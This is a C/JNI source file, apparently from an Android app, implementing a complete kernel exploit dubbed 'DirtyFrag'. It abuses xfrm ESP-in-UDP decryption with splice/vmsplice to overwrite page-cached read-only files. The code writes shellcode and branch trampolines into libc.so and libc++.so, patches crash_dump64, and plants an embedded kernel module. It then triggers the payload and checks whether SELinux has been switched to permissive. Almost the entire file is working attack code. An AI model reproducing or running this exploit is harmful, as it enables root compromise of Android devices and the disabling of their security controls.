#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#include <poll.h>
#include <jni.h>
#include <sched.h>
#include <sys/mman.h>
#include "logging.h"

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif

jmethodID report_mid;

JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
    JNIEnv *env;
    (*vm)->GetEnv(vm, (void**) &env, JNI_VERSION_1_4);
    jclass clz = (*env)->FindClass(env, "org/lsposed/lspromise/DirtyFrag");
    report_mid = (*env)->GetMethodID(env, clz, "report", "(Ljava/lang/String;)V");
    return JNI_VERSION_1_4;
}

struct Reporter {
    JNIEnv *env;
    jobject obj;
};

static void report(struct Reporter *reporter, const char* msg) {
    if (!reporter) return;
    JNIEnv *env = reporter->env;
    jstring s = (*env)->NewStringUTF(env, msg);
    (*env)->CallVoidMethod(env, reporter->obj, report_mid, s);
    (*env)->ExceptionClear(env);
    (*env)->DeleteLocalRef(env, s);
}

#define REPORT(...) (reportfmt(reporter, __VA_ARGS__))
#define REPORTLN(fmt, ...) (reportfmt(reporter, fmt "\n" __VA_OPT__(,) __VA_ARGS__))

static void reportfmt(struct Reporter *reporter, const char *fmt, ...) __attribute__((__format__(printf, 2, 3)));
static void reportfmt(struct Reporter *reporter, const char *fmt, ...) {
    if (!reporter) return;
    va_list va;
    va_start(va, fmt);
    char buf[1024];
    vsnprintf(buf, sizeof(buf), fmt, va);
    report(reporter, buf);
}

static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";

#define ENC_PORT         4500
#define SEQ_VAL          200
#define REPLAY_SEQ       100
#define PAYLOAD_LEN      128

static void put_attr(struct nlmsghdr *nlh, int type, const void *data, size_t len) {
    struct rtattr *rta = (struct rtattr *) ((char *) nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static int del_sa(int fd, uint32_t spi)
{
    char buffer[256];
    struct nlmsghdr *nlh = (struct nlmsghdr *)buffer;
    struct xfrm_usersa_id *sa_id;

    //LOGD("delete spi %x", spi);

    memset(buffer, 0, sizeof(buffer));
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*sa_id));
    nlh->nlmsg_type = XFRM_MSG_DELSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_seq = 2;

    sa_id = (struct xfrm_usersa_id *)NLMSG_DATA(nlh);

    sa_id->daddr.a4 = inet_addr("127.0.0.1");;
    sa_id->spi = htonl(spi);
    sa_id->family = AF_INET;
    sa_id->proto = IPPROTO_ESP;

    if (send(fd, nlh, nlh->nlmsg_len, 0) < 0) {
        PLOGE("del_sa send");
        //close(fd);
        return -1;
    }
    char rbuf[4096];
    int n = recv(fd, rbuf, sizeof(rbuf), 0);
    if (n < 0) {
        PLOGE("del_sa recv");
        //close(fd);
        return -1;
    }
    struct nlmsghdr *rh = (struct nlmsghdr *) rbuf;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *e = NLMSG_DATA(rh);
        if (e->error) {
            if (e->error != -EEXIST) {
                //LOGE("del_sa nlmsg err: %d", e->error);
            }
            //close(fd);
            return e->error;
        }
    }

    return 0;
}


static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi) {
    int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (sk < 0) {
        PLOGE("socket");
        return -1;
    }
    struct sockaddr_nl nl = {.nl_family = AF_NETLINK};
    if (bind(sk, (struct sockaddr *) &nl, sizeof(nl)) < 0) {
        PLOGE("bind");
        close(sk);
        return -1;
    }

    del_sa(sk, spi);

    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *) buf;
    nlh->nlmsg_type = XFRM_MSG_NEWSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_seq = 1;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

    struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *) NLMSG_DATA(nlh);
    xs->id.daddr.a4 = inet_addr("127.0.0.1");
    xs->id.spi = htonl(spi);
    xs->id.proto = IPPROTO_ESP;
    xs->saddr.a4 = inet_addr("127.0.0.1");
    xs->family = AF_INET;
    xs->mode = XFRM_MODE_TRANSPORT;
    xs->replay_window = 0;
    xs->reqid = 0x1234;
    xs->flags = XFRM_STATE_ESN;
    xs->lft.soft_byte_limit = (uint64_t) -1;
    xs->lft.hard_byte_limit = (uint64_t) -1;
    xs->lft.soft_packet_limit = (uint64_t) -1;
    xs->lft.hard_packet_limit = (uint64_t) -1;
    xs->sel.family = AF_INET;
    xs->sel.prefixlen_d = 32;
    xs->sel.prefixlen_s = 32;
    xs->sel.daddr.a4 = inet_addr("127.0.0.1");
    xs->sel.saddr.a4 = inet_addr("127.0.0.1");

    {
        char alg_buf[sizeof(struct xfrm_algo_auth) + 32];
        memset(alg_buf, 0, sizeof(alg_buf));
        struct xfrm_algo_auth *aa = (struct xfrm_algo_auth *) alg_buf;
        strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name) - 1);
        aa->alg_key_len = 32 * 8;
        aa->alg_trunc_len = 128;
        memset(aa->alg_key, 0xAA, 32);
        put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg_buf, sizeof(alg_buf));
    }
    {
        char alg_buf[sizeof(struct xfrm_algo) + 16];
        memset(alg_buf, 0, sizeof(alg_buf));
        struct xfrm_algo *ea = (struct xfrm_algo *) alg_buf;
        strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name) - 1);
        ea->alg_key_len = 16 * 8;
        memset(ea->alg_key, 0xBB, 16);
        put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
    }
    {
        struct xfrm_encap_tmpl enc;
        memset(&enc, 0, sizeof(enc));
        enc.encap_type = UDP_ENCAP_ESPINUDP;
        enc.encap_sport = htons(ENC_PORT);
        enc.encap_dport = htons(ENC_PORT);
        enc.encap_oa.a4 = 0;
        put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
    }
    {
        char esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
        memset(esn_buf, 0, sizeof(esn_buf));
        struct xfrm_replay_state_esn *esn = (struct xfrm_replay_state_esn *) esn_buf;
        esn->bmp_len = 1;
        esn->oseq = 0;
        esn->seq = REPLAY_SEQ;
        esn->oseq_hi = 0;
        esn->seq_hi = patch_seqhi;
        esn->replay_window = 32;
        put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(esn_buf));
    }

    if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) {
        PLOGE("send");
        close(sk);
        return -1;
    }
    char rbuf[4096];
    int n = recv(sk, rbuf, sizeof(rbuf), 0);
    if (n < 0) {
        PLOGE("recv");
        close(sk);
        return -1;
    }
    struct nlmsghdr *rh = (struct nlmsghdr *) rbuf;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *e = NLMSG_DATA(rh);
        if (e->error) {
            if (e->error != -EEXIST)
                LOGE("nlmsg err: %d", e->error);
            close(sk);
            return e->error;
        }
    }
    close(sk);
    return 0;
}

#define BATCH 8

#define DEBUG_SPLICE_HELPER 0

static int do_one_write(int file_fd, off_t offset, uint32_t spi, int use_helper) {
    int ret = -1;
    int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_recv < 0) {
        PLOGE("socket");
        return -1;
    }
    int one = 1;
    setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa_d = {
        .sin_family = AF_INET,
        .sin_port   = htons(ENC_PORT),
        .sin_addr   = {inet_addr("127.0.0.1")},
    };
    if (bind(sk_recv, (struct sockaddr *) &sa_d, sizeof(sa_d)) < 0) {
        PLOGE("bind");
        goto out_close_1;
    }
    int encap = UDP_ENCAP_ESPINUDP;
    if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) {
        PLOGE("setsockopt");
        goto out_close_1;
    }
    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) {
        PLOGE("socket2");
        goto out_close_1;
    }
    if (connect(sk_send, (struct sockaddr *) &sa_d, sizeof(sa_d)) < 0) {
        PLOGE("connect");
        goto out_close_2;
    }

    int pfd[2];
    if (pipe(pfd) < 0) {
        PLOGE("pipe");
        goto out_close_2;
    }

    uint8_t hdr[24];
    *(uint32_t *) (hdr + 0) = htonl(spi);
    *(uint32_t *) (hdr + 4) = htonl(SEQ_VAL);
    memset(hdr + 8, 0xCC, 16);

    struct iovec iov_h = {.iov_base = hdr, .iov_len = sizeof(hdr)};
    if (vmsplice(pfd[1], &iov_h, 1, 0) != (ssize_t) sizeof(hdr)) {
        PLOGE("vmsplice");
        goto out_close_3;
    }
    off_t off = offset;
    ssize_t s;
    if (use_helper) {
        s = -1;
#if DEBUG_SPLICE_HELPER
        int logpipe[2] = {-1,-1};
        if (pipe(logpipe) < 0) {
            PLOGE("make log pipe");
            goto out_close_3;
        }
#endif
        char buf2[18];
        snprintf(buf2, sizeof(buf2), "%lu", off);

        int pid = syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
        if (pid < 0) {
            PLOGE("vfork");
            goto out_close_logpipe;
        } else if (pid == 0) {
#if DEBUG_SPLICE_HELPER
            close(logpipe[0]);
            if (logpipe[1] != 0 && dup2(logpipe[1], 0) < 0) {
                PLOGE("dup logpipe");
            }
            close(logpipe[1]);
#endif
            if (pfd[1] != 1 && dup2(pfd[1], 1) < 0) {
                PLOGE("setfd");
                _exit(1);
            }
            execl(kCrashDump, "crashdump64", buf2, NULL);
            _exit(1);
        } else {
            //LOGD("pid: %d", pid);
#if DEBUG_SPLICE_HELPER
            close(logpipe[1]);
            logpipe[1] = -1;
#endif
            int status;
            if (TEMP_FAILURE_RETRY(waitpid(pid, &status, 0)) < 0) {
                PLOGE("waitpid");
                goto out_close_logpipe;
            }
            if (!(WIFEXITED(status) && WEXITSTATUS(status) == 0)) {
                LOGE("not return success: status=%x signaled=%d ret=%d", status, WIFSIGNALED(status), WEXITSTATUS(status));
#if DEBUG_SPLICE_HELPER
                struct pollfd pollfds = {.fd = logpipe[0], .events = POLLIN, .revents = 0};
                for (;;) {
                    if (TEMP_FAILURE_RETRY(poll(&pollfds, 1, 0)) < 0) {
                        PLOGE("no events");
                        break;
                    }

                    if (pollfds.revents & ~POLLIN) {
                        LOGE("has other events than pollin: %x", pollfds.revents);
                        break;
                    }

                    char logbuf[64];
                    ssize_t rd = read(logpipe[0], logbuf, sizeof(logbuf));
                    if (rd < 0) {
                        PLOGE("rd");
                        break;
                    }

                    char outbuf[64*2+16];
                    char *p = outbuf;
                    for (ssize_t j = 0; j < rd; j++) {
                        snprintf(p, outbuf + sizeof(outbuf) - p, "%02x", logbuf[j]);
                        p += strlen(p);
                    }
                    LOGD("log buf: %s", outbuf);
                }
                goto out_close_logpipe;
#endif
            }
        }
        s = 16;

        out_close_logpipe:
#if DEBUG_SPLICE_HELPER
        if (logpipe[0] >= 0) close(logpipe[0]);
        if (logpipe[1] >= 0) close(logpipe[1]);
#endif
        if (s != 16) {
            LOGE("splicehelper error");
            goto out_close_3;
        }
    } else {
        s = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
        if (s != 16) {
            PLOGE("splice %zu", s);
        }
    }
    s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
    /* still proceed regardless of splice rc — kernel may have already
     * decrypted the page in the time between splice and recv */
    // we may not need this.
    // usleep(150 * 1000);

    ret = s == 40 ? 0 : -1;

out_close_3:
    close(pfd[0]);
    close(pfd[1]);
out_close_2:
    close(sk_send);
out_close_1:
    close(sk_recv);
    return ret;
}

static int patch_file(const char *path, char *addr, size_t len, size_t foff, int beginspi, int use_helper, struct Reporter *reporter) {
    int file_fd;
    if (use_helper) {
        file_fd = -1;
    } else {
        file_fd = open(path, O_RDONLY);
        if (file_fd < 0) {
            PLOGE("open");
            return -1;
        }
    }
    /* Install 40 xfrm SAs, one per 4-byte chunk.  Each carries the
     * desired payload word in its seq_hi field. */
    for (int i = 0; i < len / 4; i++) {
        uint32_t spi = beginspi + i;
        uint32_t seqhi =
            ((uint32_t) addr[i * 4 + 0] << 24) |
            ((uint32_t) addr[i * 4 + 1] << 16) |
            ((uint32_t) addr[i * 4 + 2] << 8) |
            ((uint32_t) addr[i * 4 + 3]);
        int ret = add_xfrm_sa(spi, seqhi);
        if (ret < 0) {
            LOGE("add_xfrm_sa #%d failed: %d", i, ret);
            close(file_fd);
            return -1;
        }
        //LOGI("%d: %02x %02x %02x %02x", i, addr[i*4], addr[i*4+1], addr[i*4+2], addr[i*4+3]);
    }
    LOGI("installed %zu xfrm SAs", len / 4);
    LOGD("patch at offset %zu", foff);
    //REPORTLN("patch at offset %zu", foff);

    for (int i = 0; i < len / 4; i++) {
        uint32_t spi = beginspi + i;
        off_t off = foff + i * 4;
        if (do_one_write(file_fd, off, spi, use_helper) < 0) {
            LOGW("do_one_write #%d at off=0x%lx failed", i, (long) off);
            close(file_fd);
            return -1;
        }
        //LOGD("do_one_write #%d at off=0x%lx", i, (long) off);
        if (i % 100 == 0) {
            LOGD("wrote %d", i * 4);
            REPORT("%d ...", i*4);
        }
    }
    LOGI("wrote %d bytes to %s starting at 0x%x", len, path, foff);
    //REPORTLN("\nwrote %d bytes to %s starting at 0x%x", len, path, foff);
    REPORTLN("patched %zu bytes", len);
    // not close, hold it
    // LOGD("leaked fd %d", file_fd);
    close(file_fd);
    return 0;
}

extern char stage1_start[];
extern char stage1_data[];
extern uint32_t stage1_len;
extern char stage1_first_inst_copy[];

extern char stage2_start[];
extern char stage2_data[];
extern uint32_t stage2_len;
extern char stage2_first_inst_copy[];

int find_hook_target(const char *libcxx, const char* symname, uint64_t *hook_target, uint64_t *payload_target, uint32_t* first_instruction);

int patch_libc(struct Reporter *reporter) {
    uint64_t hook_offset, shellcode_offset;
    uint32_t first_insn;
    int ret;
    ret = find_hook_target("/system/lib64/libc.so",  "__libc_init", &hook_offset, &shellcode_offset, &first_insn);
    if (ret) {
        LOGE("find_hook_target");
        REPORTLN("find libc hook target failed");
        return ret;
    }

    LOGD("hook libc offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage2_len);
    // REPORTLN("hook libc offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage2_len);

    // Aarch64 branch
    const uint32_t BRANCH = 0x14000000;

    // Build branch instruction for first instruction of hook target.
    uint32_t hook_data = BRANCH;
    uint32_t start_offset = (char*)stage2_start - (char*)stage2_data;
    size_t offs = shellcode_offset + start_offset - hook_offset;
    LOGI("jump off %lx", offs);
    // REPORTLN("jump off %lx", offs);
    hook_data |= ((offs) >> 2) & ((1 << 26) - 1);
    int hook_data_size = 4;
    LOGI("hook insn: %x", hook_data);
    // REPORTLN("hook insn: %x", hook_data);

    // Jump back to hook target + 4.
    uint32_t jmpback = BRANCH;
    jmpback |= (((hook_offset + 4) - (shellcode_offset + stage2_len - 4)) >> 2) & 0x3ffffff;
    *(uint32_t *)&stage2_data[stage2_len - 4] = jmpback;

    *(uint32_t *)&stage2_first_inst_copy[0] = first_insn;

    REPORTLN("Shell code size: %d 0x%x bytes", stage2_len, stage2_len);

    size_t foff = shellcode_offset;

    REPORTLN("* patch #3");
    ret = patch_file("/system/lib64/libc.so", stage2_data, stage2_len, foff, 0xDEADBE10, 0, reporter);
    if (ret) {
        LOGE("patch shellcode err %d", ret);
        REPORTLN("patch shellcode err: %d", ret);
        return ret;
    }

    REPORTLN("* patch #4");
    ret = patch_file("/system/lib64/libc.so", (char*) &hook_data, sizeof(hook_data), hook_offset, 0xDEADBCCC, 0, reporter);
    if (ret) {
        REPORTLN("patching trampoline err %d", ret);
        LOGE("patch trampoline err %d", ret);
        return ret;
    }
    return 0;
}

int patch_cxx(int run_index, struct Reporter *reporter) {
    uint64_t hook_offset, shellcode_offset;
    uint32_t first_insn;
    int ret;
    ret = find_hook_target("/system/lib64/libc++.so",  "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_", &hook_offset, &shellcode_offset, &first_insn);
    if (ret) {
        LOGE("find cxx hook target err: %d", ret);
        REPORTLN("find cxx hook target err: %d", ret);
        return ret;
    }

    LOGD("hook offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage1_len);
    // REPORTLN("hook offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage1_len);

    // Aarch64 branch
    const uint32_t BRANCH = 0x14000000;

    // Build branch instruction for first instruction of hook target.
    uint32_t hook_data = BRANCH;
    uint32_t start_offset = (char*)stage1_start - (char*)stage1_data;
    size_t offs = shellcode_offset + start_offset - hook_offset;
    LOGI("jump off %lx", offs);
    //REPORTLN("jump off %lx", offs);
    hook_data |= ((offs) >> 2) & ((1 << 26) - 1);
    int hook_data_size = 4;
    LOGI("hook insn: %x", hook_data);
    //REPORTLN("hook insn: %x", hook_data);

    //sprintf(stage1_filename, "/dev/.dirtypipe-%04d", run_index);
    //LOGI("Stage1 debug filename: %s", stage1_filename);
    // strcpy(stage1_stage2_libname, "");

    // Jump back to hook target + 4.
    uint32_t jmpback = BRANCH;
    jmpback |= (((hook_offset + 4) - (shellcode_offset + stage1_len - 4)) >> 2) & 0x3ffffff;
    *(uint32_t *)&stage1_data[stage1_len - 4] = jmpback;

    *(uint32_t *)&stage1_first_inst_copy[0] = first_insn;

    //REPORTLN("Shell code size: %d 0x%x bytes\n", stage1_len, stage1_len);

    size_t foff = shellcode_offset;

    LOGI("patching libc++ shellcode");
    REPORTLN("patch #5");
    ret = patch_file("/system/lib64/libc++.so", stage1_data, stage1_len, foff, 0xDEADBE10, 0, reporter);
    if (ret) {
        REPORTLN("patch libc++ shellcode err %d", ret);
        LOGE("patch libc++ shellcode err %d", ret);
        return ret;
    }

    REPORTLN("patch #6");
    LOGI("patching libc++ trampoline");
    ret = patch_file("/system/lib64/libc++.so", (char*) &hook_data, sizeof(hook_data), hook_offset, 0xDEADBCCC, 0, reporter);
    if (ret) {
        REPORTLN("patch libc++ trampoline err %d", ret);
        LOGE("patch libc++ trampoline err %d", ret);
        return ret;
    }
    return 0;
}

asm(
    ".section .rodata\n"
    ".global dirtyfrag_ko_start\n"
    ".global dirtyfrag_ko_end\n"
    "dirtyfrag_ko_start:\n"
    ".incbin \"dirtyfrag.ko\"\n"
    "dirtyfrag_ko_end:\n"
);

asm(
    ".section .rodata\n"
    ".global splice_helper_start\n"
    ".global splice_helper_end\n"
    "splice_helper_start:\n"
    ".incbin \"splicehelper\"\n"
    "splice_helper_end:\n"
    );

extern char dirtyfrag_ko_start[];
extern char dirtyfrag_ko_end[];
extern char splice_helper_start[];
extern char splice_helper_end[];

int patch_ko(struct Reporter *reporter) {
    //char buf[] = {1,2,3,4};
    LOGD("patch1");
    size_t len = splice_helper_end - splice_helper_start;
    // "/vendor/lib/libstagefright_soft_g711dec.so"
    LOGD("patching crashdump");
    REPORTLN("* patch #1");
    int ret =
    patch_file(kCrashDump, splice_helper_start, len, 0, 0xdead0000, 0, reporter);

    LOGD("patch crashdump ret %d", ret);
    if (ret) {
        REPORTLN("patch #1 ret %d", ret);
        return ret;
    }

    len = dirtyfrag_ko_end - dirtyfrag_ko_start;

    LOGD("patching vendorfile");
    REPORTLN("* patching #2");
    ret = patch_file("[vendorfile]", dirtyfrag_ko_start , len, 0, 0xdead0000, 1, reporter);
        // patch_file("", buf, sizeof(buf), 0, 0xdead0000, 1);

    LOGD("patch2 ret %d", ret);
    if (ret) {
        REPORTLN("patch #2 ret %d", ret);
    }

    return ret;
}

JNIEXPORT jint JNICALL
Java_org_lsposed_lspromise_DirtyFrag_patchMod(JNIEnv *env, jclass clazz) {
    LOGI("starting patchMod uid=%d", getuid());
    /*
    int fd = open(kCrashDump, O_RDONLY);
    LOGD("leaked crashdump32 fd %d", fd);
    struct stat st;
    fstat(fd, &st);
    LOGD("mmap sz %zu", st.st_size);
    void *addr = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    LOGD("mmap addr %p", addr);*/

    pid_t cpid = fork();
    if (cpid < 0) return 1;

    if (cpid == 0) {
        int rc = patch_ko(NULL);
        _exit(rc == 0 ? 0 : 2);
    }
    int cstatus;
    waitpid(cpid, &cstatus, 0);
    if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
        LOGE("corruption stage failed (status=0x%x)", cstatus);
        return 1;
    }

    LOGI("page-cache patched");
    return 0;
}

JNIEXPORT jint JNICALL
Java_org_lsposed_lspromise_DirtyFrag_patchLibc(JNIEnv *env, jclass clazz) {
    LOGI("starting patchLibc uid=%d", getuid());
    pid_t cpid = fork();
    if (cpid < 0) return 1;
    if (cpid == 0) {
        int rc = patch_libc(NULL);
        _exit(rc == 0 ? 0 : 2);
    }
    int cstatus;
    waitpid(cpid, &cstatus, 0);
    if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
        LOGE("corruption stage failed (status=0x%x)", cstatus);
        return 1;
    }

    LOGI("page-cache patched");
    return 0;
}

JNIEXPORT jint JNICALL
Java_org_lsposed_lspromise_DirtyFrag_patchCxx(JNIEnv *env, jclass clazz) {
    LOGI("starting patchCxx uid=%d", getuid());
    pid_t cpid = fork();
    if (cpid < 0) return 1;
    if (cpid == 0) {
        int rc = patch_cxx(0, NULL);
        _exit(rc == 0 ? 0 : 2);
    }
    int cstatus;
    waitpid(cpid, &cstatus, 0);
    if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
        LOGE("corruption stage failed (status=0x%x)", cstatus);
        return 1;
    }

    LOGI("page-cache patched");
    return 0;
}

static int createOrphanProcess() {

    int pid = fork();
    if (pid < 0) {
        PLOGE("fork");
    } else if (pid == 0) {
        int pid2 = fork();
        if (pid2 < 0) {
            PLOGE("fork2");
        } else if (pid2 == 0) {
            sleep(1);
            _exit(0);
        } else {
            LOGD("created orphan process %d", pid2);
            _exit(0);
        }
    } else {
        TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
    }
    return 0;
}

JNIEXPORT jint JNICALL
Java_org_lsposed_lspromise_DirtyFrag_createOrphanProcess(JNIEnv *env, jclass clazz) {
    return createOrphanProcess();
}

static int getenforce() {
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY|O_CLOEXEC);
    if (fd < 0) {
        PLOGE("open enforce");
        return 1;
    }
    char buf;
    if (read(fd, &buf, sizeof(buf)) != sizeof(buf)) {
        close(fd);
        return 1;
    }
    close(fd);
    return buf == 1;
}

static int has_mark() {
    return access("/dev/df", F_OK) == 0 || errno != ENOENT;
}

JNIEXPORT void JNICALL
Java_org_lsposed_lspromise_DirtyFrag_runAll(JNIEnv *env, jobject thiz) {
    struct Reporter reporterobj = {
        .env = env,
        .obj = thiz
    }, *reporter = &reporterobj;
    if (patch_ko(reporter)) {
        return;
    }
    if (patch_libc(reporter)) {
        return;
    }
    if (patch_cxx(0, reporter)) {
        return;
    }
    for (int i = 0; i < 6; i++) {
        usleep(300000);
        REPORTLN("* trying to trigger (%d)..", i);
        createOrphanProcess();
        usleep(300000); // 300ms
        REPORTLN("done: %d", has_mark());
        int force = getenforce();
        REPORTLN("selinux enforcing: %d", force);
        if (force == 0) return;
    }
    REPORTLN("selinux permissive is not detected, exploition may failed!");
}
